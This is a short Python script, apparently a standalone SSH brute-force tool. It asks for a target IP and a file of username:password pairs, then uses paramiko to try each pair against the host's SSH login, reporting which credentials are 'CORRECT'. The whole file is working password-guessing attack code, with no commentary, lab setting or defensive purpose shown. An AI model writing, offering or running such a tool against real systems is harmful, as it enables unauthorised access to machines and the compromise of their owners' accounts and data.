import paramiko, sys, time, threading


    
IP =input('enter ip:')
file2=input('enter file name:')
ip=IP; filename=file2

fd = open(file2, "r")

def attempt(IP,UserName,Password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(IP, username=UserName, password=Password)
    except paramiko.AuthenticationException:
        print ('[-] %s:%s fail!' % (UserName, Password))
    else:
        print ('[!] %s:%s is CORRECT!' % (UserName, Password))
    ssh.close()
    return

print ('[+] Bruteforcing against %s with dictionary %s' % (ip, filename))
for line in fd.readlines():
    username, password = line.strip().split(":")
    t = threading.Thread(target=attempt, args=(ip,username,password))
    t.start()
    time.sleep(0.3)
    t.join()
    
fd.close()
sys.exit(0)
